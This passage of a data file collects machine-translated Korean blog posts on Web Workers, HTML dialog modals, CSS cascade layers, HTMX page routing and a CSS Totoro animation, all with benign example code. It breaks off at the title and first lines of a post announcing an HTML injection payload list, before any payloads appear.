logs={log}/>\n    </>\n  );\n};\n```\n\n# 웹 워커의 종류\n\n웹 워커는 웹 페이지의 메인 스레드와 별도로 백그라운드에서 스크립트를 실행하는 방법을 제공합니다. 사용자 인터페이스를 방해하지 않고 작업을 수행할 수 있도록 합니다. 여기에는 두 가지 주요 웹 워커의 종류가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n## 1. 전용 워커:\n\n- 전용 워커는 생성한 스크립트에 의해서만 접근할 수 있습니다.\n- 메인 스레드와 격리된 자체 스레드에서 실행됩니다.\n- 웹 페이지의 반응성에 영향을 미치지 않으면서 무거운 계산이나 시간이 오래 걸리는 작업을 처리해야 하는 상황에 유용합니다.\n- 전용 워커는 일반적으로 단일 스크립트 내에서 사용됩니다.\n\n## 2. 공유 워커:\n\n- 공유 워커는 동일한 도메인에 속하는 여러 창, 아이프레임 또는 다른 컨텍스트에서 실행 중인 여러 스크립트에서 접근할 수 있습니다.\n- 데이터를 공유하거나 응용 프로그램의 다른 부분 간의 작업을 조정해야 하는 상황에 공유 워커가 설계되었습니다.\n- 서로 다른 탭이나 프레임 간의 통신과 협업을 제공합니다.\n- 공유 워커는 더 다양하며 여러 스크립트가 동시에 활용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# 인터뷰 질문:\n\n## 웹 워커(Web Worker)란 무엇인가요?\n\n- 웹 워커(Web Worker)는 웹 애플리케이션의 주 실행 스레드와 별도의 백그라운드 스레드에서 스크립트를 실행할 수 있는 JavaScript 기능입니다.\n\n## 웹 워커(Web Worker)가 해결하는 문제는 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n- 웹 워커는 웹 애플리케이션의 응답성을 향상시키기 위해 주 스레드에서 작업을 오프로드하는 데 도움이 됩니다. 그들은 UI를 차단하지 않고 동시에 실행을 가능하게 합니다.\n\n## 웹 워커를 어떻게 생성하나요?\n\n- 웹 워커는 주 자바스크립트 코드에서 Worker 개체를 인스턴스화하고 워커 스크립트의 URL을 인수로 제공하여 생성합니다.\n\n## 웹 워커와 주 스레드 간의 통신 메커니즘은 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n- 웹 워커는 postMessage() 메서드를 사용하여 주 스레드와 통신하고 onmessage 이벤트 핸들러를 통해 메시지를 수신합니다.\n\n### 웹 워커와 주 스레드 간에 전송할 수 있는 데이터 유형은 무엇인가요?\n\n- 전송할 수 있는 데이터 유형에는 JSON 객체, ArrayBuffer, ArrayBufferView, 파일/블롭 객체 및 기타 구조화된 복제 가능한 객체가 포함됩니다.\n\n### 웹 워커의 제한사항은 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n- 웹 워커는 DOM, window, document와 같은 특정 API에 직접 액세스할 수 없으며 동기 XHR 요청을 수행할 수 없습니다. 또한, 동일 출처 정책으로 인해 다른 출처의 리소스에 액세스하는 데 제한이 있습니다.\n\n**웹 워커를 종료하는 방법은 무엇인가요?**\n\n- 메인 스레드에서 Worker 객체의 terminate() 메서드를 호출하여 웹 워커를 종료할 수 있습니다.\n\n**웹 워커에는 어떤 종류가 있나요?**\n\n<div class=\"content-ad\"></div>\n\n- 웹 워커에는 Dedicated Workers와 Shared Workers 두 가지 유형이 있어요. Dedicated Workers는 하나의 스크립트에 특화되어 있지만, Shared Workers는 여러 스크립트에서 공유할 수 있어요.\n\n## 웹 워커의 일반적인 사용 사례는 무엇인가요?\n\n- 웹 워커는 이미지 처리, 오디오/비디오 처리, 데이터 구문 분석 및 암호화/해독과 같은 CPU 집약적 작업에 주로 사용돼요. 또한 서버에서 데이터를 가져오거나 WebSocket을 통해 수신한 데이터를 처리하는 백그라운드 작업에도 사용할 수 있어요.\n\n## 웹 워커에서 오류를 처리하는 방법은 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n- 웹 워커 내에서 발생하는 오류는 onerror 이벤트 핸들러를 사용하여 캡처할 수 있습니다. 또한 postMessage()를 사용하여 메시지를 메인 스레드로 보내고 메인 스레드에서 처리할 수 있습니다.\n\n## 참고 문서:\n\n- https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers\n- https://www.freecodecamp.org/news/how-webworkers-work-in-javascript-with-example/","ogImage":{"url":"/assets/img/2024-05-02-WebWorkersInterviewQuestions_0.png"},"coverImage":"/assets/img/2024-05-02-WebWorkersInterviewQuestions_0.png","tag":["Tech"],"readingTime":6},{"title":"HTML <dialog> 요소를 사용한 JavaScript와 React에서의 모달(dialog)","description":"","date":"2024-05-02 00:07","slug":"2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact","content":"\n\n![image](/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png)\n\n다이얼로그 태그는 모달과 같은 컴포넌트를 만드는 좋은 방법입니다. 여기에는 구현하는 몇 가지 방법이 있습니다.\n\n일반적으로 `dialog`는 상호 작용 컴포넌트를 만들며, 간단한 대화상자나 모달로 변환할 수 있습니다. 전자는 컴포넌트를 단순히 열고, 후자는 모달이 열려 있는 동안 페이지의 나머지 콘텐츠를 비활성화하는 것입니다.\n\n모달의 예시는 다음과 같을 수 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n<!-- Modal - HTML -->\n<dialog id=\"modal\">\n  <h1>이것은 모달입니다.</h1>\n  <button id=\"closeModal\">모달 닫기</button>\n</dialog>\n<button id=\"openModal\">모달 보이기</button>\n```\n\n```js\n// Modal - JavaScript\nconst modal = document.getElementById(\"modal\");\nconst openModal = document.getElementById(\"openModal\");\nconst closeModal = document.getElementById(\"closeModal\");\n\nopenModal.addEventListener(\"click\", () => {\n  modal.showModal();\n});\n\ncloseModal.addEventListener(\"click\", () => {\n  modal.close();\n});\n```\n\n다이얼로그 예시는 다음과 같을 수 있습니다:\n\n```js\n<!-- Dialog - HTML -->\n<dialog id=\"dialog\">\n  <h1>이것은 다이얼로그입니다.</h1>\n  <button id=\"closeDialog\">다이얼로그 닫기</button>\n</dialog>\n<button id=\"openDialog\">다이얼로그 보이기</button>\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n// 다이얼로그 - JavaScript\nconst dialog = document.getElementById(\"dialog\");\nconst openDialog = document.getElementById(\"openDialog\");\nconst closeDialog = document.getElementById(\"closeDialog\");\n\nopenDialog.addEventListener(\"click\", () => {\n  dialog.show();\n});\n\ncloseDialog.addEventListener(\"click\", () => {\n  dialog.close();\n});\n```\n\n두 가지 사이의 유일한 차이점은 그들을 열기 위한 함수입니다. 모달의 경우 showModal() 메소드를 사용해야 하고 간단한 다이얼로그의 경우 show()를 사용해야 합니다. 코드의 나머지 부분은 동일합니다.\n\n`dialog`은 보이는 다이얼로그를 보여주는 open 속성이 있습니다 (설정된 경우). 예를 들어:\n\n```js\n<dialog open>\n  <h1>This dialog will always be shown.</h1>\n</dialog>\n```\n\n<div class=\"content-ad\"></div>\n\n표시를 켜거나 끄기 위해 true/false로 설정할 수도 있습니다 (예를 들어 React의 useState와 함께 사용할 수 있습니다). 그러나 이 경우에는 항상 비모달(non-modal)로 설정되므로 showModal()/show() 메서드를 사용하는 것이 좋습니다.\n\nReact에서 이 작업을 수행하는 한 가지 방법은 useEffect와 useRef를 사용하는 것입니다:\n\n```js\n// Modal을 별도의 컴포넌트로 만들기\nimport { useEffect, useRef } from \"react\";\n\nfunction Modal({ openModal, closeModal, children }) {\n  const ref = useRef();\n\n  useEffect(() => {\n    if (openModal) {\n      ref.current?.showModal();\n    } else {\n      ref.current?.close();\n    }\n  }, [openModal]);\n\n  return (\n    <dialog\n      ref={ref}\n      onCancel={closeModal}\n    >\n      {children}\n      <button onClick={closeModal}>\n        닫기\n      </button>\n    </dialog>\n  );\n}\n\nexport default MenuModal;\n```\n\n여기서 useRef는 렌더링 용도로 값을 참조하고, useEffect는 열기/닫기 상태를 확인하는 데 사용됩니다(이는 props를 통해 전달됩니다). 또한 올바르게 ESC 키를 사용하기 위해 onCancel 속성도 있습니다(키보드로 모달을 닫으려는 경우 사용할 수 있습니다).\n\n<div class=\"content-ad\"></div>\n\n그럼 모달 구성 요소를 페이지 구성 요소에 추가하고 useState로 상태를 설정해야 합니다. 모달을 열거나 닫으려면 다음을 추가하십시오:\n\n```js\n// 페이지 구성 요소\nimport { useState } from \"react\";\nimport { Modal } from \"./Modal\";\n\nfunction PageComponent() {\n  const [modal, setModal] = useState(false);\n\n  return (\n    <button\n      onClick={() => setModal(true)}\n    >\n      모달 열기\n    </button>\n    <Modal\n      openModal={modal}\n      closeModal={() => setModal(false)}\n    >\n      모달 내용.\n    </Modal>\n  )\n\nexport default PageComponent;\n```\n\n위의 React 예시에서 showModal() 메서드를 show()로 변경하면 모달 대신 간단한 대화상자를 사용합니다. 이 경우 대화상자를 기타 요소 위에 표시하려는 경우 CSS 파일에서 z-index를 추가로 설정해야 할 수 있습니다 (대화상자가 열렸을 때 다른 요소에 접근할 수 있게 합니다).\n\nCSS에 대한 추가 설정으로는 모달에 대한 ::backdrop 가상 요소를 설정하는 것이 있습니다. 예를 들어 배경을 어둡게 하려면 (기본 변형보다 더 어둡게) 다음과 같이 설정할 수 있습니다:```\n\n<div class=\"content-ad\"></div>\n\n```js\n.modalClassName::backdrop {\n  background: rgba(0, 0, 0, 0.5);\n}\n```\n\n다음은 `dialog` 요소를 사용하는 몇 가지 가능한 방법입니다. `div`와 같은 변종을 사용하는 대신 모달/대화 상자에 적절한 태그를 가지고 있는 것은 좋은 점이지만 물론 항상 다른 접근 방식이 있습니다.\n\n읽어 주셔서 감사합니다.\n```","ogImage":{"url":"/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png"},"coverImage":"/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png","tag":["Tech"],"readingTime":4},{"title":"CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)","description":"","date":"2024-05-02 00:05","slug":"2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature","content":"\n\n![sandwich](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png)\n\n샌드위치를 상상해보세요. 샌드위치는 여러 가지 재료가 서로 층을 이루듯 쌓여져 있습니다. 상추, 토마토, 패티, 소스, 치즈. 각 재료는 전체 샌드위치에 중요하며 추가될 때마다 그 맛이 달라집니다. 맨 위에 추가된 재료의 우선순위가 다른 모든 재료를 압도합니다. 따라서 샌드위치를 섭취하는 경우 치즈, 소스, 패티, 토마토, 그리고 상추의 맛을 느낄 것입니다.\n\nCSS 캐스케이드 레이어도 마찬가지입니다. 각 CSS 레이어에는 요소 선택기에 적용되는 특정한 명시도가 있습니다. 특정 레이어가 특정 레이어 뒤에 나타날 경우, 이전 요소의 선택기보다 더 높은 명시도를 가진 동일한 요소에 대해서도 이전 레이어의 명시도를 무시합니다. 3개의 레이어가 있는 경우 어떤 CSS 스타일이 적용될지 이해하기 위해 아래 다이어그램을 살펴보세요.\n\n![CSS Cascade Layers](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_1.png)\n\n<div class=\"content-ad\"></div>\n\n위의 이미지에서, 3개의 층이 서로 겹쳐져 있습니다. 첫 번째 층은 Layer 1이 처음에 나타나고, Layer 3은 가장 아래에 나타납니다. 샌드위치 비유에 따르면, Layer 1은 샌드위치의 밑바닥(상추)에 있고, Layer 3은 위쪽(치즈)에 있습니다. 여기서 div 요소에 대한 고도의 선택자를 가지고 있는 Layer 1과 Layer 2도 있지만, 적용되는 최종 스타일은 Layer 3의 것입니다. 이것은 카스케이딩의 원리에 따라 작동합니다.\n\nCSS 레이어는 CSS 파일에서 @layer를 사용하여 정의할 수 있습니다. 단일 파일 내에서 여러 개의 카스케이드 레이어가 있는 경우, @layer를 사용하여 레이어 우선 순위 순서를 정의할 수 있습니다. 즉, base, utilities, component의 우선 순위 순서를 정의하는 것입니다. 이것은 base가 가장 낮은 우선 순위를 가지고 component가 가장 높은 우선 순위를 가진다는 것을 말합니다. HTML 요소에 적용되는 스타일의 순서는 먼저 base, 그 다음에 utilities, 마지막으로 component입니다. 아래 코드를 확인해보세요:\n\nHTML\n\n```js\n<p class=\"alert\">좀비에 주의하세요</p>\n```  \n\n<div class=\"content-ad\"></div>\n\nCSS\n\n```js\n@layer base, utilities;\n\n@layer utilities {\n  .alert {\n    background-color: brown;\n  }\n  p {\n    border: medium solid limegreen;\n  }\n}\n\n@layer base {\n  .alert {\n    border: medium solid violet;\n    background-color: yellow;\n    color: white;\n  }\n}\n```\n\n결과\n\n<img src=\"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_2.png\" />\n\n<div class=\"content-ad\"></div>\n\n위의 코드에서 우리는 우선순위 순서가 명확히 정의되어 있음을 볼 수 있습니다. 가장 높은 우선순위는 유틸리티에게 주어지며, 첫 번째 줄의 레이어 목록에서 맨 뒤에 나타납니다. 그 다음으로 스타일은 아래 형식을 사용하여 레이어 내에 정의할 수 있습니다:\n\n```js\n@layer LAYER_NAME {\n// 여기에 스타일 규칙을 작성하세요\n}\n\n@layer LAYER_NAME {\n// 여기에 스타일 규칙을 작성하세요\n}\n```\n\n레이어는 개발자가 파일 맨 위에 요소에 레이어가 적용되어야 하는 우선순위를 이미 정의했기 때문에 임의의 순서로 정의할 수 있습니다.\n\n계층 내의 스타일 규칙은 함께 적용됩니다. 이것은 CSS에서 캐스케이딩에 대해 더 세부적인 제어를 개발자에게 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n## 익명 캐스케이드 레이어\n\n레이어 외에 있는 모든 스타일 규칙은 익명 레이어로 묶이고 이 익명 레이어는 모든 정의된 레이어보다 높은 우선순위를 갖습니다. 예를 들어 아래와 같이 구성할 수 있습니다. \n\n```css\n@layer utilities {\n  .alert {\n    background-color: brown;\n  }\n  p {\n    border: medium solid limegreen;\n  }\n}\n\n@layer base {\n  .alert {\n    border: medium solid violet;\n    background-color: yellow;\n    color: white;\n  }\n}\n\n.alert {\n  background-color: red;\n}\n```\n\n위의 경우, 출력 결과는 아래와 같습니다:\n\n<div class=\"content-ad\"></div>\n\n\\[이미지\\]\\(/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_3.png\\)  \n\n한 번 레이어 순서가 정해지면 특이성과 나타나는 순서는 무시됩니다. CSS 캐스케이드 레이어의 이 기능을 통해 개발자들은 더 간단한 선택자를 만들 수 있습니다. 더 이상 특이성을 무효화해야 하는 곳에 해킹이나 치트를 찾을 필요가 없어졌습니다.\n\n익명 캐스케이드 레이어는 레이어를 만들되 이름을 할당하지 않음으로써 만들 수 있습니다:\n\n```js\n@layer {\n  p {\n    margin-block: 1rem;\n  }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n## 스타일 규칙을 레이어로 가져오기\n\n개발자들은 다른 CSS 모듈 파일을 가져와서 레이어에 할당할 수 있습니다. 예를 들어,\n\n```js\n@import \"theme.css\" layer(utilities);\n```\n\n위 예시에서 theme.css 파일의 내용이나 스타일 규칙이 utilities 레이어에 할당됩니다.\n\n<div class=\"content-ad\"></div>\n\n## 중첩 레이어\n\n레이어는 아래 형식을 사용하여 중첩될 수 있습니다:\n\n```js\n@layer framework {\n  @layer layout {\n  }\n}\n```\n\n새로운 스타일 규칙은 다음 형식을 사용하여 레이아웃 레이어에 추가할 수 있습니다. 즉, 부모 레이어와 자식 레이어 사이에 . 을 추가하는 것입니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n@layer framework.layout {\n  p {\n    margin-block: 1rem;\n  }\n}\n```\n\n## 브라우저 호환성\n\n@layer와 이 기능의 브라우저 호환성이 매우 뛰어나며 요즘에는 널리 사용됩니다.\n\n![이미지](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_4.png)\n\n<div class=\"content-ad\"></div>\n\n이 기사가 도움이 되었으면 좋겣아. 이 기사를 CSS 친구들이나 웹 개발에 관심 있는 친구들과 공유해 주시면 감사하겠어요. 제 Medium 블로그를 구독하고 이 기사를 좋아요를 눌러주세요. @layer의 사용 사례를 댓글 섹션에 언급해 주세요.\n\n# 간단하게 설명 🚀\n\nIn Plain English 커뮤니티의 일원이 되어 주셔서 감사합니다! 떠나시기 전에:\n\n- 반드시 박수를 치고 작가를 팔로우해 주세요 ️👏️️\n- 우리를 팔로우하세요: X | LinkedIn | YouTube | Discord | Newsletter\n- 다른 플랫폼에서 저희를 방문해보세요: Stackademic | CoFeed | Venture | Cubed\n- PlainEnglish.io에서 더 많은 콘텐츠를 확인하세요","ogImage":{"url":"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png"},"coverImage":"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png","tag":["Tech"],"readingTime":4},{"title":"HTMX를 활용해 쉬운 페이지 라우팅하기","description":"","date":"2024-05-02 00:04","slug":"2024-05-02-EffortlessPageRoutingUsingHTMX","content":"\n\n![이미지](/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png)\n\n리액트는 종종 웹 애플리케이션에 지나치게 많은 요소를 포함하고 있을 수 있으며, HTMX와 함께 웹 서버만 사용하여 상호 작용 애플리케이션을 만드는 것이 동등한 결과를 얻을 수 있는 경우가 있습니다.\n\n이 블로그 포스트에서는 HTMX를 활용하여 상호 작용이 가능하고 화면 깜빡임이 없는 페이지 이동을 작성하는 방법을 설명하겠습니다:\n\n## 서버 설정\n\n<div class=\"content-ad\"></div>\n\n```js\nmkdir no-react-app \ncd no-react-app\nnpm init -y\nnpm install express nunjucks\n```\n\n그런 다음 서버 파일을 만들고 실행합니다.\n\n```js\n//File: app.js\nconst express = require(\"express\")\nconst app = express()\n\nconst nunjucks = require('nunjucks');\nnunjucks.configure(\"views\", {\n    autoescape: true,\n    express: app\n});\n\napp.get(\"/\", (req, res) => {\n    res.render(\"pages/home.html\")\n})\n\napp.get(\"/users\", (req, res) => {\n    res.render(\"pages/users.html\")\n})\n\napp.get(\"/posts\", (req, res) => {\n    res.render(\"pages/posts.html\")\n})\n\napp.listen(3000, () => {\n    console.info(`Application running http://localhost:3000`)\n})\n```\n\n저희는 템플릿 엔진으로 nunjucks를 사용합니다. 모든 템플릿, 레이아웃 및 부분 파일은 \"views\" 디렉토리에 저장됩니다. 따라서 프로젝트 구조는 다음과 같을 것입니다.\n\n<div class=\"content-ad\"></div>\n\n## 앱 구조\n\n```js\napp.js\nviews\n  layouts\n    main.html\n  partials\n    sidenav.html\n  pages\n    user.html\n    home.html\n    posts.html\n```\n\n템플릿 엔진을 사용하기 때문에 모든 뷰가 확장할 레이아웃을 추가합시다.\n\n## 메인 레이아웃\n\n<div class=\"content-ad\"></div>\n\n```js\n<!--File: views/layouts/main.html-->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <link rel=\"stylesheet\"\n        href=\"https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css\" />\n    <title>HTMX App</title>\n</head>\n\n<body class=\"bg-gray-200\">\n    <div class=\"flex h-screen\">\n        <!-- Side Navigation -->\n        {- include('partials/sidenav.html')}\n\n        <!-- Main Content Area -->\n        <div class=\"w-full bg-white p-4\" id=\"main\">\n            { block content }{ endblock }\n        </div>\n</body>\n\n</html>\n``` \n\nsidenav 템플릿 컴포넌트를 partials로 리팩터링하여 레이아웃에 포함했습니다.\n\n## Side Nav Component\n\n```js\n<!--File: views/partials/sidenav.html-->\n<div class=\"w-56 bg-gray-800 text-white p-4\">\n    <a href=\"/\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Home</a>\n    <a href=\"/users\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Users</a>\n    <a href=\"/posts\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Posts</a>\n</div>\n```\n\n<div class=\"content-ad\"></div>\n\n그리고 우리는 메인 페이지인 home.html, users.html 및 posts.html을 만들었습니다.\n\n## 페이지\n\n```js\n<!--views/pages/home.html-->\n{ extends 'layouts/main.html' }\n\n{ block content }\n<h1 class=\"text-2xl font-bold mb-4\">HTMX Nav</h1>\n{ endblock }\n```\n\n```js\n<!--views/pages/users.html-->\n{ extends 'layouts/main.html' }\n\n{ block content }\n<h1 class=\"text-2xl font-bold mb-4\">Users</h1>\n{ endblock }\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n<!-- views/pages/posts.html -->\n{ extends 'layouts/main.html' }\n\n{ block content }\n<h1 class=\"text-2xl font-bold mb-4\">Posts</h1>\n{ endblock }\n```\n\n서버를 실행하면 네비게이션이 있지만 전체 페이지가 다시 로드됩니다:\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*yPvQ3Jj47osdFfxsoMXqSg.gif\" />\n\nHTMX라는 가벼운 JavaScript 라이브러리를 사용하여 이 문제를 해결해야 합니다. 이 라이브러리는 보다 더 순조롭고 상호작용적인 사용자 네비게이션 경험을 크게 향상시킬 수 있습니다. HTMX는 더 다양한 응용 프로그램에서 사용할 수 있지만, 현재 목적에 맞게 더 원활한 네비게이션을 달성하기 위해 그 능력을 활용하는 데 중점을 둘 것입니다.\n\n<div class=\"content-ad\"></div>\n\n## HTMX를 사용하여 점진적으로 향상시키기\n\nHTMX를 사용하는 가장 빠른 방법은 CDN을 통해 로드하는 것입니다. 다음 코드를 head 태그에 추가하면 간단히 시작할 수 있습니다:\n\n```js\n<!--File: views/layouts/main.html-->\n...\n<script src=\"https://unpkg.com/htmx.org@latest\"></script>\n<title>HTMX App</title>\n</head>\n...\n```\n\n이제 사이드네비게이션 바에 작은 변경을 가할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n- href 속성을 제거하고 hx-get 속성으로 대체합니다. 사용자가이 링크를 클릭하면 HTTP GET 요청이 발생합니다.\n- 각 앵커에 hx-target 속성을 추가하거나 앵커 상위 div에 하나 추가하십시오. hx-target 속성을 사용하면 응답을 교체할 요소를 대상으로 지정할 수 있습니다.\n- 각 앵커에 hx-push-url=\"true\"를 추가하십시오. hx-push-url 속성을 사용하면 URL을 브라우저 위치 기록에 추가할 수 있습니다. 이를 통해 새로운 기록 항목이 생성되어 브라우저의 뒤로/앞으로 버튼을 사용한 탐색이 가능합니다.\n\n이것이 무엇을 하는가: 우리는 \"main\" id의 div에서 응답을 삽입할 때 HTMX lib에 서버 호출을 만드는 방법을 선언적으로 지시하고 있습니다.\n\n```js\n<div class=\"w-56 bg-gray-800 text-white p-4\" hx-target=\"#main\">\n    <a hx-get=\"/\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Home</a>\n    <a hx-get=\"/users\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Users</a>\n    <a hx-get=\"/posts\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\">Posts</a>\n</div>\n```\n\n이제 다음과 같습니다.\n\n<div class=\"content-ad\"></div>\n\n![image](https://miro.medium.com/v2/resize:fit:1400/1*LOvL_BdO8v6B-La18uqJug.gif)\n\n번쩍임 문제를 해결했고 새로운 URL로 올바르게 전환됩니다. 이제 다른 사람에게 내비게이션을 공유하고 싶다면 새로운 URL로 이동하게 됩니다.\n\n### 앱을 HTMX 알아보기\n\n각 서버 요청이 HTMX 호출인지 여부를 결정해야 합니다. 만약 HTMX 호출이라면 레이아웃을 사용하지 말고 해당 템플릿의 HTML을 그대로 반환하도록 템플릿 엔진에 지시해야 합니다. 이를 위해 특정 미들웨어를 포함해야 합니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// 파일: app.js\n...\napp.use((req, res, next) => {\n    res.locals.useLayout = req.headers[\"hx-request\"] !== \"true\";\n    next();\n})\n\napp.listen(3000, () => {\n    console.info(`애플리케이션이 http://localhost:3000에서 실행 중입니다.`)\n})\n```\n\nHTMX 요청이 감지되지 않는 경우에만 레이아웃을 사용합니다.\n\n```js\n<!-- 파일: views/layouts/main.html -->\n{ if useLayout }\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <link rel=\"stylesheet\"\n        href=\"https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css\" />\n    <script src=\"https://unpkg.com/htmx.org@latest\"></script>\n    <title>HTMX App</title>\n</head>\n<body class=\"bg-gray-200\">\n    <div class=\"flex h-screen\">\n        <!-- Side Navigation -->\n        {- include('partials/sidenav.html')}\n        <!-- Main Content Area -->\n        <div class=\"w-full bg-white p-4\" id=\"main\">\n{ endif }\n\n            { block content }{ endblock }\n\n{ if useLayout }\n        </div>\n</body>\n</html>\n{ endif }\n```\n\nURL을 공유할 수 있도록 원활하고 번쩍임 없는 내비게이션 경험을 성공적으로 달성했습니다.\n\n<div class=\"content-ad\"></div>\n\n[이미지](https://miro.medium.com/v2/resize:fit:1400/1*hdhwN-9D2qdkYFyXwJ6XEg.gif)\n\n원본 블로그 게시물: [https://nanosoft.co.za/blog/post/express-htmx](https://nanosoft.co.za/blog/post/express-htmx)\n\n소스 코드: [https://github.com/nanosoftonline/express-htmx](https://github.com/nanosoftonline/express-htmx)","ogImage":{"url":"/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png"},"coverImage":"/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png","tag":["Tech"],"readingTime":7},{"title":"HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기","description":"","date":"2024-05-02 00:03","slug":"2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS","content":"\n\n![이미지](https://miro.medium.com/v2/resize:fit:1200/1*DQhfTbm3hP_-igEhkhk4Hw.gif)\n\n스튜디오 지브리의 매력을 웹 개발 여정에 더해볼준비가 되셨나요? 오늘의 프로젝트에서는 사랑받는 영화 \"이웃의 토토로\"의 상징적 캐릭터에서 영감을 받아 애니메이션된 점프하는 토토로를 만들어볼 것입니다. 이 프로젝트는 #100DaysOfCode 챌린지 22일차의 일환으로, HTML, CSS 및 소량의 애니메이션 마법으로 프론트엔드 개발을 탐험하는 과정입니다. 시작해봅시다!\n\n# 단계 1: 프로젝트 설정하기\n\n시작하기 전에, 제공된 링크에서 전체 소스 코드를 다운로드했는지 확인해주세요: 소스 코드 다운로드. 다운로드가 완료되면, 새 프로젝트 디렉토리를 생성하고 소스 코드 파일을 추출하세요.\n\n<div class=\"content-ad\"></div>\n\n# 단계 2: 구조 이해하기\n\n코드 에디터에서 프로젝트 파일을 열어보세요. 여기에는 HTML, CSS 및 필요에 따라 JavaScript 파일이 포함되어 있을 겁니다. 다양한 파일이 어떻게 연결되어 있는지 이해해보세요.\n\n# 단계 3: HTML 마크업\n\nindex.html 파일을 열어보세요. 이곳에서 우리의 웹 페이지 구조를 정의합니다. HTML 마크업에는 컨테이너, 토토로의 몸통 부분(귀, 눈, 코 등) 및 애니메이션 클래스 등 다양한 요소가 포함되어 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# 단계 4: CSS로 스타일링하기\n\nstyle.css 파일에서 당신은 당신의 토토로에 생명을 불어넣는 스타일을 찾을 수 있습니다. CSS에는 위치, 크기, 색상 및 애니메이션 키프레임이 포함되어 뛰는 효과를 만듭니다. 각 CSS 규칙은 특정 요소나 애니메이션 속성에 해당합니다.\n\n# 단계 5: 애니메이션 추가하기\n\nstyle.css 파일에 정의된 CSS 애니메이션 키프레임을 살펴보세요. 이러한 키프레임은 토토로의 몸통, 귀, 수염 및 그림자의 움직임과 압축 효과를 제어합니다. 원하는 효과를 달성하기 위해 애니메이션 지속 시간, 타이밍, 그리고 이징을 실험해보세요.\n\n<div class=\"content-ad\"></div>\n\n# 단계 6: 테스트 및 디버깅\n\n수정을 완료한 후 인덱스.html 파일을 웹 브라우저에서 열어 애니메이션을 테스트하세요. 브라우저의 개발자 도구를 사용하여 요소를 검사하고 CSS 문제를 디버깅하며 애니메이션 매개변수를 세밀하게 조정하세요.\n\n# 단계 7: 튜닝 및 사용자 정의\n\n원하는 대로 토토로 디자인, 색상 및 애니메이션을 사용자 정의하세요. 토토로의 몸통 부분의 크기, 위치, 모양을 조절하거나 전체적인 모습을 향상시키기 위해 추가 요소를 추가할 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# 단계 8: 당신의 작품 공유하기\n\n애니메이션으로 뛰어오르는 토토로에 만족하셨다면, 소셜 미디어나 코드 공유 플랫폼에 프로젝트를 공유해 다른 사람들을 영감을 주고 코딩 스킬을 과시해보세요. 또한 이 프로젝트를 만들면서 느낀 경험을 나누며 동료 개발자들과 연결할 수도 있어요. 이것이 #100DaysOfCode 챌린지의 22일차를 완료한 것을 축하합니다!\n\n애니메이션으로 뛰어오르는 토토로를 만들면서 프론트엔드 개발 스킬을 키우는 동시에 코딩 여정에 신비로운 터치를 불어넣었어요. 계속해서 코딩을 하며 창작을 이어가고 영감을 받아보세요! 궁금한 점이 있거나 경험을 공유하고 싶다면 언제든지 Bento에서 저와 연락하실 수 있어요.\n\n행복한 코딩 하세요! 🚀✨","ogImage":{"url":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png"},"coverImage":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png","tag":["Tech"],"readingTime":2},{"title":"HTML 삽입 (페이로드 목록)","description":"","date":"2024-05-02 00:01","slug":"2024-05-02-HTMLINJECTIONPayloadList","content":"\n\n피신몽인 사람들, 다시 돌아\n\n주사, 이제 페이로드 목록을 가져 오는 것을 보여드리고, 검색 패널에서 시도해 볼 수 있으며, 그대로 반영될 수 있습니다 & 저장되면 위험할 수도 있습니다,\n\n이제 같은 것에 